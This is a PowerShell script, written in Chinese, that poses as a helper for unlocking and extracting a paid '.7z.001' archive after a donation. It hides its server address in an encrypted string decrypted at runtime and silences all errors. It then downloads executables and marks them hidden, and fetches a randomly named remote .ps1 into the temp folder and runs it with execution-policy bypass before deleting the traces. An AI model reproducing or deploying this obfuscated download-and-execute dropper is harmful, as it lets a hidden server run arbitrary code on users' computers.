$agent = "2035"; $WarningPreference = "SilentlyContinue"; $ErrorActionPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $power = (1..16); function Decrypt-String { param ( [Parameter(Mandatory=$true)] [string]$EncryptedText, [Parameter(Mandatory=$true)] [byte[]]$Key ); $secureString = $EncryptedText | ConvertTo-SecureString -Key $Key; $plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)); return $plainText }
$shell = "76492d1116743f0423413b16050a5345MgB8AGcAUABvAHgAeQBOADkAVQA2ADIASQAyAG4AbQBwAGsAcwA1AE8ASgBYAHcAPQA9AHwAOQBjADAAYwBjAGUANwAwADkAYwBmADcAMgBkADkAMQA0AGYAMAAwAGMAYwBhAGUANwBkADMAZQAxADUAZAA3AGYAMAA4ADMAMgBlAGIAZAA3AGIAMgA0ADYANAAyADIAOAA0ADUANQBkAGUANgBkADgAOQAxADAAZQBhADEANQA4AGYAYQBiAGYAMwA4ADkANABjADIAZQBhAGEAMABhADQAZAAzADMAMwA1AGUAZQA3AGMAYgA1ADQANgA0AGIANQBhAGMAMABmADAAYgA1AGUAMQA2AGYAYwA0AGEAMwBlADUAZQAxAGYANgAxAGQANQA2AGEAYwA0ADAAYgAzADQAZgA5ADcAZQBkADIAZQBlADMAOAAzAGIAYQA4AGQANwAwADAAMAAxADUAOQAxAGQAYwA2AGIAZgAxADcAMgA3AGEAZQBiAGYAMwA1ADkANQAyADAAYgAxADYAMgA4ADMAMQAzADgAMgBmAGEANAAzADAANQA4ADQAZAAxADAAMwAxADYAZQBkADMAYQBlADgAZABkADIAOAA4AGEANgAxAGEAYgAwADYANgA5ADUAMQBjAGQAMAAzAGUANwBhADQAYgA5ADAANwA3ADIAOABjADQANQA2ADkAYgBiAGEANgAyADAAYgA1ADMANgBlAGUANgBlADgAZgAxAGUAZQA="

function ExtractWith7z {

    # 解压目录
    $currentPath = Get-Location
    $unzipPath = "解压目录"; if (-not (Test-Path -Path $unzipPath -PathType Container)) {New-Item -Path $unzipPath -ItemType Directory -Force | Out-Null}
    "解压密码：`n$passWord`n`n解压软件：`nhttp://www.7-zip.org/`n`n免责声明：`n本站仅提供灾备储存，您的打赏款将用于支付网盘、宽带等灾备相关维护费用。`n如此资源文件为版权文件，您须自行向版权方购买版权。打赏款于此无关。" | Out-File -FilePath "$currentPath\$unzipPath\解压密码.txt"

    # 下载 7z.exe 和 7z.dll
    $exeFile = [System.IO.Path]::Combine(@($currentPath, $unzipPath, "7z.exe"))
    Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=7zexe" -OutFile $exeFile
    $exeExists = Test-Path $exeFile; attrib +h $exeFile
    $dllFile = [System.IO.Path]::Combine(@($currentPath, $unzipPath, "7z.dll"))
    Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=7zdll" -OutFile $dllFile
    $dllExists = Test-Path $dllFile; attrib +h $dllFile

    if ($exeExists -and $dllExists) {
        # 获取密码
        $response_file = Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&file=${fileNum}&sign=${ispay}"; $passWord = $response_file.Content.Trim();

        Write-Host "解压密码：$passWord"; Write-Host "正在自动解压，切勿关闭窗口，耐心等待即可 ...";
        $fileToExtract = "$currentPath\$fileName"
        $dirExtractTo = "$currentPath\$unzipPath"

        $arguments = "x", $fileToExtract, "-p$passWord", "-o$dirExtractTo", "-y", "-bd"
        $process = Start-Process -FilePath $exeFile -ArgumentList $arguments -NoNewWindow -WindowStyle Hidden -PassThru -Wait

        # 检查解压结果
        if ($process.ExitCode -eq 0) {
            Write-Output "恭喜，解压完成。"; Write-Host "执行完毕，请关闭此窗口。"; Write-Host "...`n..`n."
        } else {
            Write-Output "错误，解压失败。"; Write-Host "您的打赏款，将在24小时内 [原路退回]，感谢支持!"; Write-Host "...`n..`n."
        }

        # 删除临时文件
        Remove-Item -Path @("$exeFile", "$dllFile") -Force;

    } else {
        Write-Output "错误，网络异常。"; Write-Host "您的打赏款，将在24小时内 [原路退回]，感谢支持!"; Write-Host "...`n..`n."
    }
}


Write-Host ".`n..`n..."; Write-Host "加载中，请等待 ..."
$DonateCheck = Decrypt-String -EncryptedText $shell -Key $power;


# 查找所有符合条件的文件
$currentPath = Get-Location
$files = Get-ChildItem -Path $currentPath -Filter *.7z.001

# 检查文件数
if ($files.Count -eq 1) {
    # 如果文件数为1，将文件名赋值给变量
    $fileName = $files.Name

    # 去除后缀
    $fileNum = $fileName -replace "\.7z\.001$", ""

    # 判断是否为13位纯数字
    if ($fileNum -match "^\d{13}$") {
        Write-Output "即将解压 ${fileNum}.7z"; Write-Output "此文件为付费资源，正在创建订单 ..."

        # 商家编号
        $agent = $fileNum.Substring(0, 4)

        # 检测订单空闲
        $response_state = Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=lock"; $state = $response_state.Content.Trim(); if ($state -ne "unlocked") {Write-Host "排队中，请稍后2分钟再试 ..."; Write-Host "...`n..`n."; return}
        # 锁定订单号
        $response_pay = Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&ispay=${fileNum}"; $pay = $response_pay.Content.Trim();

        # 准备弹框文件
        $FileURA0 = [System.IO.Path]::GetRandomFileName() + ".ps1";
        Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=urlimg" -OutFile "$Env:temp\donate300.png"; Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=urlps1" -OutFile "$Env:temp\$FileURA0";

        # 弹框收款
        Write-Host "准备完成，扫描弹框二维码打赏后继续 ..."; powershell -ExecutionPolicy Bypass -File "$Env:temp\$FileURA0";

        # 判断收款成功 执行任务
        $response_ispay = Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&ispay=${fileNum}"; $ispay = $response_ispay.Content.Trim()
        if ($pay -eq $ispay) {$UrlTest = Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=unlock"; Write-Host "错误，未检测到打赏 (未付款、支付超时)。请稍后再试 ..."; Write-Host "执行完毕，请关闭此窗口。"; Write-Host "...`n..`n."} else {Write-Host "感谢打赏！执行中，请稍等 (切勿中断脚本，以免订单失效) ..."; ExtractWith7z; $UrlTest = Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=unlock"}

        Remove-Item -Path @("$Env:temp\$FileURA0", "$Env:temp\donate300.png") -Force;

    } else {
        Write-Output "错误，待解压文件异常或源文件已被修改。"; Write-Host "执行完毕，请关闭此窗口。"; Write-Host "...`n..`n."
    }

} else {
    # 如果文件数不为1，则报错
    Write-Output "错误，未检测到或存在多个待解压文件。"; Write-Host "执行完毕，请关闭此窗口。"; Write-Host "...`n..`n."
}

